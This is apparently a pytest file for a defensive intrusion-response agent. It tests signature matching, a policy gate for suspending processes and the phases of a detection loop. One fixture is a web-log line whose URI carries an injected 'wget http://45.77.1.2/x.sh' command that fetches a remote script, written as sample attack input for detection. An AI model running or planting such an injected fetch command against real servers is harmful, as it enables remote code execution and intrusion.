from __future__ import annotations

import time

from aegis_agent.ai.rule_engine import analyze_chain
from aegis_agent.core.loop_controller import LoopController
from aegis_agent.core.policy_gate import PolicyGate
from aegis_agent.core.signature_engine import SignaturePatternEngine
from aegis_agent.evidence.builder import build_evidence_chains
from aegis_agent.models import ActionPlan, Event, EvidenceChain, new_id


def test_signature_pattern_becomes_evidence_and_block_action():
    ev = Event(
        new_id("E"), time.time(), "access.log", "http_request", "host", "low",
        '198.51.100.44 - - [x] "GET /?cmd=wget%20http://45.77.1.2/x.sh HTTP/1.1" 200 1',
        src_ip="198.51.100.44", uri="/?cmd=wget%20http://45.77.1.2/x.sh",
    )
    sigs = SignaturePatternEngine({"enabled": True, "load_defaults": True}).evaluate([ev])
    assert sigs
    assert sigs[0].event_type == "signature_match"
    chains = build_evidence_chains([ev] + sigs)
    assert chains
    chain = chains[0]
    assert chain.score >= 60
    analysis = analyze_chain(chain)
    assert any(a["action"] == "block_ip_ttl" and a["target"] == "198.51.100.44" for a in analysis.recommended_actions)


def test_suspend_process_requires_auditd_pid_relation_in_policy():
    policy = {
        "policy": {
            "actions": {
                "suspend_process": {
                    "enabled": True,
                    "auto_allowed": True,
                    "min_score": 1,
                    "ttl_required": False,
                    "rollback_required": True,
                    "require_auditd_pid_relation": True,
                }
            },
            "evidence": {"min_events_for_response": 1},
            "allowlists": {"ips": [], "cidrs": [], "process_names": [], "accounts": []},
        }
    }
    gate = PolicyGate(policy)
    ev = Event("E1", time.time(), "process_snapshot", "suspicious_process", "h", pid=999, process="999 bash /tmp/x")
    ch = EvidenceChain("C1", "h", [ev], {"pid": ["999"]}, score=99)
    plan = ActionPlan("A1", "suspend_process", "999 bash /tmp/x", "test", ["E1"], 99, metadata={})
    assert not gate.check(plan, ch).allowed

    plan_ok = ActionPlan(
        "A2", "suspend_process", "999 bash /tmp/x", "test", ["E1"], 99,
        metadata={"requires_auditd_pid_relation": True, "audit_serial": "123"},
    )
    assert gate.check(plan_ok, ch).allowed


def test_loop_process_phases_are_recorded_for_incident(tmp_path):
    auth = tmp_path / "auth.log"
    auth.write_text("\n".join(
        f"Jul 07 10:00:{i:02d} host sshd[123]: Failed password for invalid user attacker from 198.51.100.77 port 55{i:03d} ssh2"
        for i in range(10)
    ))
    cfg = {
        "agent": {"id": "test", "audit_db": str(tmp_path / "audit.db"), "state_dir": str(tmp_path / "state"), "max_iterations": 1},
        "ai": {"provider": "rule_based"},
        "central": {"enabled": False},
        "telemetry": {"auth_logs": [str(auth)], "web_logs": [], "auditd_logs": [], "realtime": {"enabled": False}, "fim": {"enabled": False}},
        "enforcement": {"dry_run": True, "require_cli_enable_flag": True, "prefer_backend": "memory"},
        "signature_patterns": {"enabled": True, "load_defaults": True},
        "loop_process": {"enabled": True},
    }
    policy = {
        "policy": {
            "thresholds": {"collect_more": 20},
            "evidence": {"min_events_for_response": 1},
            "allowlists": {"ips": [], "cidrs": [], "process_names": [], "accounts": []},
            "actions": {
                "block_ip_ttl": {"enabled": True, "auto_allowed": True, "min_score": 50, "ttl_required": True, "rollback_required": True},
                "rate_limit_ip": {"enabled": True, "auto_allowed": True, "min_score": 40, "ttl_required": True, "rollback_required": True},
            },
        }
    }
    inc = LoopController(cfg, policy, enable_enforcement=False).run_once()
    assert inc
    phases = [p["phase"] for p in inc[0]["loop_process"]]
    assert "collect_telemetry" in phases
    assert "signature_pattern_scan" in phases
    assert "build_evidence_chain" in phases
    assert "policy_gate" in phases
    assert "local_enforcement" in phases
